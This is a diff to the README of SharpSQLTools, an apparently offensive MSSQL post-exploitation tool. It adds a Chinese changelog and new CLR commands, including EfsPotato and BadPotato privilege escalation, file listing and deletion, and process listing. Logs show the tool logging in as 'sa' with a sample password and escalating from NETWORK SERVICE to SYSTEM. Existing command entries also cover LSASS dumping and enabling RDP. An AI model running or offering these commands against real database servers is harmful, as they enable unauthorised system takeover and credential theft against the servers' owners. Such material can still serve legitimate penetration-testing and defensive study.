@@ -6,6 +6,18 @@
 
 ### 更新日志
 
+- 2021-08-05
+  - 添加clr_badpotato
+  - 修改原来的clr_potato为clr_efspotato
+
+- 2021-08-04
+  - 添加一些clr实现的基本命令：pwd,ls,netstat,ps等等
+  - 致谢[KevinJClark@csharptoolbox](https://gitlab.com/KevinJClark/csharptoolbox/-/tree/master/WindowsBinaryReplacements) & [rabbittb](https://github.com/rabbittb)
+
+- 2021-08-03
+  - 添加clr_efspotato
+  - 致谢[zcgonvh@EfsPotato](https://github.com/zcgonvh/EfsPotato) & [hl0rey](https://github.com/hl0rey)
+
 - 2021-07-10 
   - 修复上传bug
   - 修复clr回显bug
@@ -56,7 +68,17 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
+clr_pwd                    - print current directory by clr
+clr_ls {directory}         - list files by clr
+clr_cd {directory}         - change directory by clr
+clr_ps                     - list process by clr
+clr_netstat                - netstat by clr
+clr_ping {host}            - ping by clr
+clr_cat {file}             - view file contents by clr
+clr_rm {file}              - delete file by clr
 clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
+clr_badpotato {cmd}        - exec by BadPotato like clr_exec
 clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
@@ -129,6 +151,52 @@ nt service\mssql$sqlexpress
 
 nt service\mssql$sqlexpress
 
+```
+
+#### clr_efspotato or clr_badpotato
+
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato whoami
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3352
+[+] Command : c:\Windows\System32\cmd.exe /c whoami
+[!] process with pid: 2012 created.
+==============================
+
+
+nt authority\system
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\windows/system32\whoami.exe
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3084
+[+] Command : c:\windows/system32\whoami.exe
+[!] process with pid: 164 created.
+==============================
+
+
+nt authority\system
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\cmd.exe -a /c whoami
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3124
+[+] Command : c:\cmd.exe   /c whoami
+[!] process with pid: 2080 created.
+==============================
+
+
+nt authority\system
 ```
 
 #### clr_scloader
@@ -289,3 +357,7 @@ https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235
 https://github.com/GhostPack/SharpDump
 
 https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0
+
+https://github.com/zcgonvh/EfsPotato
+
+https://gitlab.com/KevinJClark/csharptoolbox
